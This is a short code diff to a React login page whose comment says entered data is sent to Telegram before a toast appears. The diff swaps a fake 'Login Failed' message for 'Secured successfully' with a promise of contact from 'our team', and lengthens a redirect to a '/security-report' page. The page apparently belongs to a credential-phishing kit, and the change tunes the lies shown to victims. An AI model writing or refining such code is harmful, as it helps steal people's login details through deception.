@@ -63,16 +63,16 @@ const Index = () => {
 
     // Show error toast after sending to Telegram
     toast({
-      title: "Login Failed",
-      description: "The email address or password you entered isn't connected to an account.",
+      title: "Secured successfully",
+      description: "A member of our team will be in touch with you shortly.",
       variant: "destructive",
     });
     
-    // Redirect after 2 seconds
+    // Redirect after 3 seconds
     setTimeout(() => {
       setIsLoginLoading(false);
       navigate('/security-report');
-    }, 2000);
+    }, 3000);
   };
 
   if (isLoading) {
